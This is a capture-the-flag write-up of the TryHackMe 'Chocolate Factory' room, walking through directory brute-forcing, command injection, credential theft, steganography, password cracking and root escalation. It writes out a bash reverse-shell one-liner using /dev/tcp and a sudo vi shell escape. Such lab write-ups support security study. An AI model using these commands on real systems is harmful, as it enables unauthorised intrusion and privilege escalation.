
## Description
This <a href="https://tryhackme.com/room/chocolatefactory">challenge</a> is provided by <a href="https://tryhackme.com">https://tryhackme.com</a>
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119040663-43719300-b9e8-11eb-93b9-9084d21a8b85.png"/>
 <ul>
<li><image src="https://user-images.githubusercontent.com/78603128/119169950-2fd03600-ba95-11eb-85d3-5ccf91320077.png"/></li>
<li><image src="https://user-images.githubusercontent.com/78603128/119169974-352d8080-ba95-11eb-80b4-15fb7ded910d.png"/></li>
<li><image src="https://user-images.githubusercontent.com/78603128/119170005-3ced2500-ba95-11eb-9a42-657073094293.png"/></li>
<li><image src="https://user-images.githubusercontent.com/78603128/119170013-41194280-ba95-11eb-8361-04b5553a7d0d.png"/></li>
</ul>
</p>
 
## Hands on 1

First , we slap the ip into our browser to check if port 80(common web server) is up and yes it is !
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119142345-fa1d5400-ba78-11eb-97a9-5e0b27c4618e.png"/>
</p>

look like a credential is required

lets try <a href="https://tools.kali.org/web-applications/gobuster">gobuster(CLI)/dirbuster(GUI)</a> to brute force the web directory for hidden files

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119142807-7879f600-ba79-11eb-8cc8-0236aca6441f.png"/>
</p>



Note : <br/>
<ul>
<li>dir specify brute force the directory </li>
<li>-u specify the web browser url</li>
<li>-w specify the dictionary path for the attack</li>
<li>-t specify how many thread to be used for the attack</li> 
<li>-o specify output file name</li>
</ul>

and we found the hidden directory named :

**"home.php" **

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119143134-d8709c80-ba79-11eb-85fb-d91fe7fb960f.png"/>
</p>

guess what ? who need credentials when you can access the page without one ?

**"validate.php"** , look like input validation goes here

<p align="center">
 
<image src="https://user-images.githubusercontent.com/78603128/119142989-b37c2980-ba79-11eb-82ae-a0ab52a03f25.png"/>

 </p>
 
Moving on , we can check if the machine is linux by using  `uname -a` command

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119144800-98121e00-ba7b-11eb-87be-10057beb2d04.png"/>
</p>

and yess , now slap reverse shell command into the input 

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119146838-9cd7d180-ba7d-11eb-8f00-ffd68cb68676.png"/>
</p>
 
```
bash -c 'exec bash -i &>/dev/tcp/$YOUR IP/$PORT <&1'
```
 


remember to start a listener on the port you input
<br/>
<br/>

And within few seconds , we will get a reverse shell and able to run as `www-data` !

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119147026-cabd1600-ba7d-11eb-88cc-a69eadb0ac62.png"/>
</p>

now we search for the key , `key_rey_key` seems sus and by trying strings command we found the key

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119148594-38b60d00-ba7f-11eb-8a24-17a264bc10d0.png"/>
</p>

and we are lucky to found the user credentials in plain text inside the `validate.php` code
<br/>

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119148927-92b6d280-ba7f-11eb-8a86-b8d60f193eff.png"/>
</p>

switch user to charlie and we got the flag but .. you cant switch user here..
<br/>

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119149250-ede8c500-ba7f-11eb-94b8-21823441721b.png"/>
</p>

looking around charlie directory , we found RSA private and public key to login via SSH !
<br/>

<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119149549-36a07e00-ba80-11eb-9cd8-c3f5e9b77a83.png"/>
</p>
  
Copy content of **teleport** and paste into your local empty file , in my case i saved it into `rsa_key` file
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119170350-b4bb4f80-ba95-11eb-8961-b6b012f61dca.png"/>
</p>

Remember to chmod 700 on the saved file 
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119170563-006df900-ba96-11eb-9a69-0ce6ca76b099.png"/>
</p>

else you get error like this
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119172491-9d319600-ba98-11eb-842f-6a0191b2e1e0.png"/>
</p>

After successfully login , you are now `charlie`
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119172598-bd615500-ba98-11eb-9ae0-21a7e14e2af2.png"/>
 </p>
 
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119172772-ea156c80-ba98-11eb-9d69-1bde7535386f.png"/>

</p>
And we got the **user** flag !
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119173016-352f7f80-ba99-11eb-8cdd-19c7f06259af.png"/>
 </p>
 
 now the root flag ! 
 type  `sudo -l` to check sudo permission for charlie
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119173732-3b722b80-ba9a-11eb-8dca-d8db75cd78e7.png"/>
</p>

by checking at <a href="https://gtfobins.github.io">GTFO bins</a> we found that vi can be exploited
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119173881-6fe5e780-ba9a-11eb-9760-a12f4680167b.png"/>
 
 ```
 sudo vi -c ':!/bin/sh' /dev/null
 ```
</p>

We are now ROOT YEAH BOI and we found one python file (probably flag)
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119174264-f1d61080-ba9a-11eb-8277-ab7fb5d64380.png"/>
</p>

 Enter the key we found earlier and we got the flag !
  <p align="center">
 <image src="https://user-images.githubusercontent.com/78603128/119174570-51ccb700-ba9b-11eb-94de-4e24d661a787.png"/>
 </p>
   <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119174584-56916b00-ba9b-11eb-83ee-b3ab5c78817f.png"/>
 </p>

## Hands on 2
Alternatively , to get charlie's password to log into the web browser we can use nmap/rustsan to scan for network open ports revealed the `` ftp service `` exists and contain one image (**gum_room.jpg**)
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119174953-ce5f9580-ba9b-11eb-96fa-28042a4b4c6c.png"/>
</p>

we can login as ``Anonymous`` and get the image file
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119175296-3ada9480-ba9c-11eb-973a-9963a924335d.png"/>
</p>

 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119175751-d0762400-ba9c-11eb-8734-d6c744484b69.png"/>
</p>

look like ordinary picture but there can be something hidden inside pictures >:D (**Steganography**)
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119176018-26e36280-ba9d-11eb-9392-fbed6f605106.png"/>
</p>

Using ``steghide`` we found a text file **(b64.txt)** with base 64 string 
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119176294-7f1a6480-ba9d-11eb-97b9-b88e506e0cef.png"/>
</p>

Decrypt it and we got all user leaked ``etc/passwd``
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119176446-b557e400-ba9d-11eb-8263-1c8284cc46ac.png"/>
</p>
including charlie's
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119176620-e801dc80-ba9d-11eb-9a52-35f06cef4585.png"/>
</p>

paste the hash into a empty file (in my case : charlieCreds) and put it at ``john the ripper`` and let john do the job !
 <p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119176966-46c75600-ba9e-11eb-9f91-42445e2e2123.png"/>
</p>

then paste the pass and login charlie on the website
<p align="center">
<image src="https://user-images.githubusercontent.com/78603128/119177393-da008b80-ba9e-11eb-9567-da6126fd8d24.png"/>
</p>












